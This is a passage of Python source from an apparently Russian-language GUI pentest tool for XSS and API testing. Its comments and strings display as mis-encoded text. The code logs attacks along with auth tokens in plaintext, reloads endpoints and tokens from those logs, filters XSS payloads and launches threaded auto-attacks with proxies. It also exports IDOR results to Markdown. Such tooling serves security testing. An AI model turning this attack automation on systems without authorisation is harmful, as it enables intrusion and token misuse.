                self.response_box.insert("end", "\n\nüß† –ö–ª—é—á–∏ –≤–µ—Ä—Ö–Ω–µ–≥–æ —É—Ä–æ–≤–Ω—è:\n")
                for key in parsed.keys():
                    self.response_box.insert("end", f"  - {key}\n")
            except Exception:
                self.response_box.insert("end", response.text)

            self.log_attack(url, method, token, payload, response)

        except Exception as e:
            self.response_box.delete("1.0", "end")
            self.response_box.insert("end", f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")


    # ===== –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ API-–∞—Ç–∞–∫–∏ =====
    def log_attack(self, url, method, token, payload, response):
        """–ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ API-–∞—Ç–∞–∫–∏ —Å –∑–∞—â–∏—Ç–æ–π –æ—Ç –ø–æ–≤—Ä–µ–∂–¥—ë–Ω–Ω—ã—Ö –ª–æ–≥–æ–≤ –∏ –±–æ–ª—å—à–∏–º–∏ –æ—Ç–≤–µ—Ç–∞–º–∏."""

        os.makedirs("logs", exist_ok=True)
        history_path = "logs/api_attack_history.json"

        # –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ–º, —á—Ç–æ response –Ω–µ None
        status_code = getattr(response, "status_code", None)
        resp_text = getattr(response, "text", "")

        # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –¥–ª–∏–Ω—ã –æ—Ç–≤–µ—Ç–∞
        MAX_LEN = getattr(self.safety, "response_log_cap", 5000)
        if len(resp_text) > MAX_LEN:
            resp_preview = (
                    resp_text[:MAX_LEN]
                    + f"\n...[–û–±—Ä–µ–∑–∞–Ω–æ {len(resp_text) - MAX_LEN} —Å–∏–º–≤–æ–ª–æ–≤]"
            )
        else:
            resp_preview = resp_text

        log_entry = {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "url": url,
            "method": method,
            "token": token if token else None,
            "payload": payload,
            "status": status_code,
            "response": resp_preview,
        }

        # –ó–∞–≥—Ä—É–∂–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é –±–µ–∑–æ–ø–∞—Å–Ω–æ
        history = []
        try:
            if os.path.exists(history_path):
                with open(history_path, encoding="utf-8") as f:
                    history = json.load(f)
                if not isinstance(history, list):
                    history = []
        except Exception as e:
            # –ï—Å–ª–∏ –ª–æ–≥ –ø–æ–≤—Ä–µ–∂–¥—ë–Ω ‚Äî —Å–æ–∑–¥–∞—ë–º –Ω–æ–≤—ã–π
            self.log(f"[‚ö†Ô∏è] –ò—Å—Ç–æ—Ä–∏—è –ª–æ–≥–æ–≤ –ø–æ–≤—Ä–µ–∂–¥–µ–Ω–∞, —Å–æ–∑–¥–∞—é –Ω–æ–≤—É—é: {e}")
            history = []

        # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –∑–∞–ø–∏—Å—å
        history.append(log_entry)

        # –ê—Ç–æ–º–∞—Ä–Ω–∞—è –∑–∞–ø–∏—Å—å
        try:
            tmp_path = history_path + ".tmp"
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(history, f, indent=2, ensure_ascii=False)
            os.replace(tmp_path, history_path)

            self.log(f"[üìú] –õ–æ–≥ –∞—Ç–∞–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω: {method} {url} ‚Üí {status_code}")

        except Exception as e:
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è API-–∞—Ç–∞–∫–∏: {e}")

    # ===== –ò–º–ø–æ—Ä—Ç –ª–æ–≥–æ–≤ API-–∞—Ç–∞–∫ =====
    def import_logs(self):
        """–ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç –∏—Å—Ç–æ—Ä–∏—é API-–∞—Ç–∞–∫ –∏–∑ JSON-–ª–æ–≥–∞ –∏ –æ–±–Ω–æ–≤–ª—è–µ—Ç —Å–ø–∏—Å–∫–∏ API –∏ —Ç–æ–∫–µ–Ω–æ–≤."""
        log_path = "logs/api_attack_history.json"

        if not os.path.exists(log_path):
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–§–∞–π–ª –ª–æ–≥–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω:\n{log_path}")
            self.log("[‚ùå] –õ–æ–≥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
            return

        # –ó–∞–≥—Ä—É–∂–∞–µ–º –ª–æ–≥ –±–µ–∑–æ–ø–∞—Å–Ω–æ
        try:
            with open(log_path, "r", encoding="utf-8") as f:
                history = json.load(f)

            if not isinstance(history, list):
                raise ValueError("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç: –æ–∂–∏–¥–∞–µ—Ç—Å—è —Å–ø–∏—Å–æ–∫ –∑–∞–ø–∏—Å–µ–π")

        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ª–æ–≥–∏:\n{e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –∏–º–ø–æ—Ä—Ç–∞ –ª–æ–≥–æ–≤: {e}")
            return

        # –ò–∑–≤–ª–µ–∫–∞–µ–º API –∏ —Ç–æ–∫–µ–Ω—ã
        api_endpoints = set()
        tokens = set()

        for entry in history:
            url = entry.get("url")
            token = entry.get("token")

            if url:
                # –ë–µ—Ä—ë–º —Ç–æ–ª—å–∫–æ –±–∞–∑–æ–≤—ã–π URL –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
                base = url.split("?")[0]
                api_endpoints.add(base)

            if token:
                tokens.add(token)

        self.api_list = sorted(api_endpoints)
        self.token_list = sorted(tokens)

        # –û–±–Ω–æ–≤–ª—è–µ–º UI
        self.api_combo["values"] = self.api_list or ["‚Äî"]
        self.token_combo["values"] = self.token_list or ["‚Äî"]

        self.api_combo.set(self.api_list[0] if self.api_list else "‚Äî")
        self.token_combo.set(self.token_list[0] if self.token_list else "‚Äî")

        # –í—ã–≤–æ–¥–∏–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ response_box
        self.response_box.delete("1.0", "end")
        self.response_box.insert("end", "üì• –ò–º–ø–æ—Ä—Ç –∏–∑ –ª–æ–≥–æ–≤ –∑–∞–≤–µ—Ä—à—ë–Ω:\n\n")

        self.response_box.insert("end", f"üîπ API endpoints: {len(self.api_list)} –Ω–∞–π–¥–µ–Ω–æ\n")
        if self.api_list:
            preview = ", ".join(self.api_list[:3])
            if len(self.api_list) > 3:
                preview += " ..."
            self.response_box.insert("end", f"   ‚Üí {preview}\n")

        self.response_box.insert("end", f"üîπ Tokens: {len(self.token_list)} –Ω–∞–π–¥–µ–Ω–æ\n")
        if self.token_list:
            preview = ", ".join(self.token_list[:3])
            if len(self.token_list) > 3:
                preview += " ..."
            self.response_box.insert("end", f"   ‚Üí {preview}\n")

        self.log("[‚úÖ] –ò–º–ø–æ—Ä—Ç –ª–æ–≥–æ–≤ –∑–∞–≤–µ—Ä—à—ë–Ω —É—Å–ø–µ—à–Ω–æ.")

    # ===== –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ/—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è payload‚Äô–æ–≤ –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ =====

    def filter_payloads(self, event=None):
        """–§–∏–ª—å—Ç—Ä—É–µ—Ç payload'—ã –ø–æ –ø–æ–∏—Å–∫–æ–≤–æ–º—É –∑–∞–ø—Ä–æ—Å—É."""
        query = self.search_entry.get().strip().lower()

        # –û–±–Ω–æ–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ payload'–æ–≤, –µ—Å–ª–∏ –æ–Ω –ø—É—Å—Ç
        if not self.all_payloads:
            try:
                from xss_security_gui.payload_generator import generate_payloads
                self.all_payloads = list(generate_payloads().keys())
            except Exception:
                self.all_payloads = []

        filtered = [p for p in self.all_payloads if query in p.lower()]
        self.payload_combo["values"] = filtered

        if filtered:
            self.payload_combo.set(filtered[0])

            # –ê–≤—Ç–æ–∞—Ç–∞–∫–∞ –ø–æ —Ñ–∏–ª—å—Ç—Ä—É
            if self.auto_attack_var.get():
                self.launch_auto_attack(filtered)
        else:
            self.payload_combo.set("")

    def insert_filtered_payload(self, event=None):
        """–í—Å—Ç–∞–≤–ª—è–µ—Ç –≤—ã–±—Ä–∞–Ω–Ω—ã–π payload –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–µ –ø–æ–ª–µ."""
        selection = self.payload_combo.get()
        if selection:
            self.payload_box.delete("1.0", "end")
            self.payload_box.insert("1.0", selection)

    def launch_auto_attack(self, payloads, log_func=None):
        """
        –ó–∞–ø—É—Å–∫–∞–µ—Ç –∞–≤—Ç–æ–∞—Ç–∞–∫—É –ø–æ —Å–ø–∏—Å–∫—É payload'–æ–≤.
        –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç True –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –∑–∞–ø—É—Å–∫–µ.
        """

        # –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        if not payloads:
            return False

        url = self.api_combo.get().strip()
        if not url or url == "‚Äî":
            return False

        method = self.method_combo.get()
        token = self.token_combo.get().strip() or None

        try:
            interval = float(self.interval_entry.get())
        except Exception:
            interval = 3.0

        # –õ–æ–≥-—Ñ—É–Ω–∫—Ü–∏—è
        if log_func is None:
            def log(msg):
                try:
                    self.response_box.insert("end", msg + "\n")
                    self.response_box.see("end")
                except Exception:
                    print(msg)
        else:
            log = log_func

        # –ù–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—è payload'–æ–≤
        if not isinstance(payloads, (list, tuple)):
            payloads = [payloads]

        payloads = [p.strip() for p in payloads if isinstance(p, str) and p.strip()]
        if not payloads:
            log("‚ö†Ô∏è –ù–µ—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö payload'–æ–≤ –¥–ª—è –∞—Ç–∞–∫–∏")
            return False

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —É–∂–µ –∑–∞–ø—É—â–µ–Ω–Ω—É—é –∞—Ç–∞–∫—É
        if self.attacker and getattr(self.attacker, "running", False):
            log("‚ö†Ô∏è –ê—Ç–∞–∫–∞ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è")
            return False

        # –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–µ—Ä–∞
        try:
            self.attacker = XSSAttacker(
                url=url,
                method=method,
                token=token,
                category="filtered",
                interval=interval,
                timeout=8,
                rps=self.safety.max_rps,
                proxies=self.safety.proxies,
                on_log=log
            )

            import threading
            t = threading.Thread(
                target=self.attacker.start_custom_payloads,
                args=(payloads,),
                daemon=True
            )
            t.start()

            log("üöÄ –ê–≤—Ç–æ–∞—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞ –ø–æ —Ñ–∏–ª—å—Ç—Ä—É")
            return True

        except Exception as e:
            log(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –∞–≤—Ç–æ–∞—Ç–∞–∫–∏: {e}")
            return False

    # ===== –≠–∫—Å–ø–æ—Ä—Ç IDOR-—Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –≤ Markdown =====
    def export_idor_markdown(self):
        """–≠–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç IDOR-—Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤ Markdown-—Ç–∞–±–ª–∏—Ü—É."""
        path = "logs/idor_test_results.json"

        if not os.path.exists(path):
            messagebox.showerror("–û—à–∏–±–∫–∞", "–§–∞–π–ª idor_test_results.json –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            return

        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)

            if not isinstance(data, list):
                raise ValueError("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç JSON")

        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª:\n{e}")
            return

        md_lines = [
            "# üß™ IDOR Test Results\n",
            f"_Total Entries: {len(data)}_\n",
            "",
            "| URL | Status | Sensitive | Bytes |",
            "|-----|--------|-----------|--------|"
        ]

        for entry in data:
            url = entry.get("url", "‚Äî").replace("|", "%7C")
            url_display = url[:140] + "‚Ä¶" if len(url) > 140 else url

            status = entry.get("status", "‚Äî")
            sensitive = "‚ö†Ô∏è" if entry.get("sensitive") else "‚úÖ"
            length = entry.get("length", 0)

            md_lines.append(
                f"| `{url_display}` | `{status}` | {sensitive} | `{length}` |"
            )

        md_text = "\n".join(md_lines)

        try:
            out_path = "logs/idor_report.md"
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(md_text)

            messagebox.showinfo("Markdown-–æ—Ç—á—ë—Ç —Å–æ–∑–¥–∞–Ω", f"–§–∞–π–ª {out_path} —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω.")
            print(f"[IDOR] üìÑ –û—Ç—á—ë—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {out_path}")

        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å Markdown:\n{e}")